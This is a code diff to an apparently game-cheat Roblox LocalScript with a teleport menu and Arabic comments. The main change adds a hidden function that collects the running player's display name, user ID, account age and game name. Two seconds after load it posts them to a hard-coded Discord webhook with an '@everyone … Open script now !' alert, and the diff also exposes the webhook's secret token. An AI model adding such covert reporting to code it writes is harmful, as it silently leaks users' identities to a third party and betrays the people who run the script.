@@ -1,8 +1,44 @@
 -- LocalScript (StarterPlayerScripts)
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
+local HttpService = game:GetService("HttpService")
 local player = Players.LocalPlayer
 
+-- إرسال Webhook إلى ديسكورد
+local function sendWebhook()
+	local webhookURL = "https://discord.com/api/webhooks/1477301125320409140/VgBqzfYxi8WX9Y0RT0pD3Zpz_2sptl1iDydHUILvl7TD4EP1nS78Nkm2l4MtPXZt8yDF"
+	
+	-- جمع المعلومات
+	local displayName = player.DisplayName or player.Name
+	local userId = player.UserId
+	local accountAge = player.AccountAge  -- عدد الأيام
+	local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or game.Name
+	
+	-- إنشاء محتوى الرسالة
+	local content = "@everyone\n**دخول جديد**\n**Open script now !**\n**Display Name:** " .. displayName .. "\n**User ID:** " .. userId .. "\n**Account Age:** " .. accountAge .. " Days\n**Game:** " .. gameName
+	
+	-- إعداد البيانات للويب هوك
+	local data = {
+		content = content
+	}
+	
+	local jsonData = HttpService:JSONEncode(data)
+	
+	-- إرسال الطلب
+	local success, err = pcall(function()
+		HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
+	end)
+	
+	if not success then
+		warn("Failed to send webhook: " .. err)
+	end
+end
+
+-- انتظار قليل ثم إرسال الويب هوك
+task.wait(2)
+sendWebhook()
+
+-- باقي السكربت (نفس الكود السابق مع أسماء الأزرار المحدثة)
 local targets = {
 	["Fast"] = true,
 	["Slow"] = true,
@@ -244,7 +280,7 @@ local function createTeleportMenu()
 		btn.TextColor3 = Color3.fromRGB(255,255,255)
 		btn.Text = zoneNames[i]  -- استخدام الاسم الجديد
 		btn.Font = Enum.Font.GothamBold
-		btn.TextSize = 14  -- قد نحتاج تصغير الخط قليلاً لتناسب الأسماء الطويلة
+		btn.TextSize = 14
 		btn.Parent = buttonsHolder
 		btn.ZIndex = 101
 		Instance.new("UICorner", btn).CornerRadius = UDim.new(0,8)
